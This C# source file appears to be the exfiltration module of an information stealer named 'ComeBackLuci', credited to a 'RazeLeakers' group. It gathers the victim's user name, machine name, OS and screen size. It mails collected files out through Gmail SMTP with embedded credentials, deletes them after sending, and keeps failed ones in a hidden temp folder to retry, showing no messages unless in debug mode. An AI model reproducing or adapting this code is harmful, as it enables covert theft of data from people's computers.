using System;
using System.IO;
using System.Windows.Forms;
using System.Threading.Tasks;
using System.Collections.Generic;
using MimeKit;
using MailKit.Net.Smtp;
using MailKit.Security;
using ComeBackLuci.Properties;

namespace ComeBackLuci
{
    public class MailAttachment : IDisposable
    {
        public MimePart FileConfig { get; set; }

        public FileStream FileData { get; set; }

        public MailAttachment(FileStream fileData,MimePart fileConfig)
        {
            this.FileData = fileData;
            this.FileConfig = fileConfig;
        }

        public void Dispose()
        {
            FileData?.Dispose();
            FileConfig?.Dispose();
        }
    }

    public class MailManager : IDisposable
    {
        private List<MailAttachment> _Attachments;

        private MimeMessage _Message;
        private Multipart _Mixer;
        private TextPart _body;

        private string _User;
        private string _Password;

        private const string SERVER = "smtp.gmail.com";
        private const int PORT = 587;

        public MailManager(string email,string password,bool sendMe = false)
        {
            this._User = email;
            this._Password = password;

            this._body = new TextPart("plain") { Text = $"Install path: {Application.StartupPath}\nOS: {Environment.OSVersion}\nUser: {Environment.UserName}\nMachine: {Environment.MachineName}\nProcessor: {Environment.ProcessorCount}\nScreen: {Screen.PrimaryScreen.Bounds.Size.Width} x {Screen.PrimaryScreen.Bounds.Size.Height}\n\ngithub.com/RazeLeakers | M3RFR3T & RESTART2LIFE" };

            this._Mixer = new Multipart();

            this._Message = new MimeMessage() { Subject = "ComeBackLuci" };

            string ename = GetEmailName(email);

            this._Message.From.Add(new MailboxAddress(ename, _User));
            if (sendMe) this._Message.To.Add(new MailboxAddress(ename, _User));

            this._Attachments = new List<MailAttachment>();
        }

        public void AddRecipient(string recipMail)
        {
            if (string.IsNullOrWhiteSpace(recipMail)) return;

            _Message.To.Add(new MailboxAddress(GetEmailName(recipMail), recipMail));
        }

        public void SetSubject(string subject)
        {
            if (string.IsNullOrWhiteSpace(subject)) return;

            _Message.Subject = subject;
        }

        public void SetBody(string content)
        {
            if (content == null) return;

            _body.Text = content;
        }

        public void AddAttachment(string filePath)
        {
            if (!File.Exists(filePath)) return;

            FileStream fs;

            try { fs = File.OpenRead(filePath); }
            catch { return; }

            MimePart mp = new MimePart("text", "plain")
            {
                Content = new MimeContent(fs, ContentEncoding.Default),
                ContentDisposition = new ContentDisposition(ContentDisposition.Attachment),
                ContentTransferEncoding = ContentEncoding.QuotedPrintable,
                FileName = Path.GetFileName(filePath)
            };

            _Attachments.Add(new MailAttachment(fs, mp));
        }

        public async Task Send(bool debug = false)
        {
            AddErrorAttachments();

            if (_Attachments.Count > 0)
            {
                _Mixer.Clear();

                _Mixer.Add(_body);

                _Attachments.ForEach((e) => _Mixer.Add(e.FileConfig));

                _Message.Body = _Mixer;
            }
            else _Message.Body = _body;

            try
            {
                using (SmtpClient client = new SmtpClient())
                {
                    client.CheckCertificateRevocation = false;

                    await client.ConnectAsync(SERVER, PORT, SecureSocketOptions.StartTls);
                    await client.AuthenticateAsync(_User, _Password);
                    await client.SendAsync(_Message);
                    await client.DisconnectAsync(true);
                }

                DeleteAttachments();

                if (debug) MessageBox.Show("Message SEND!", "ComeBackLuci", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MoveErrorAttachments();

                if (debug) MessageBox.Show($"ERROR:{Environment.NewLine}{ex.Message}", "ComeBackLuci", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private string GetEmailName(string email)
        {
            int limit = email.IndexOf('@');

            return limit != -1 ? email.Substring(0, limit) : email;
        }

        private string GetErrorDir()
        {
            string errorDir = Settings.Default.ErrorDir;

            if (!Directory.Exists(errorDir))
            {
                string tempPath = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString());

                Directory.CreateDirectory(tempPath);

                errorDir = tempPath;

                Settings.Default.ErrorDir = errorDir;
                Settings.Default.Save();
            }

            return errorDir;
        }

        private void AddErrorAttachments()
        {
            foreach (var file in Directory.GetFiles(GetErrorDir())) AddAttachment(file);
        }

        private void MoveErrorAttachments()
        {
            string errorDir = GetErrorDir();

            _Attachments.ForEach(e =>
            {
                string fname = e.FileData.Name;

                if (errorDir != Path.GetDirectoryName(fname))
                {
                    e.FileConfig.Content.Dispose();

                    e.FileData.Dispose();

                    string fres = Path.Combine(errorDir, Path.GetFileName(fname));

                    File.Move(fname, fres);

                    FileStream fs = File.OpenRead(fres);

                    e.FileConfig.Content = new MimeContent(fs, ContentEncoding.Default);

                    e.FileData = fs;
                }
            });
        }

        private void DeleteAttachments()
        {
            _Attachments.ForEach((e) =>
            {
                string fname = e.FileData.Name;

                e.Dispose();

                File.Delete(fname);
            });

            _Attachments.Clear();
        }

        private void ClearAttachments()
        {
            _Attachments.ForEach((e) => e.Dispose());
            _Attachments.Clear();
        }

        public void Dispose()
        {
            _body?.Dispose();

            _Mixer?.Dispose();

            _Message?.Dispose();

            ClearAttachments();
        }
    }
}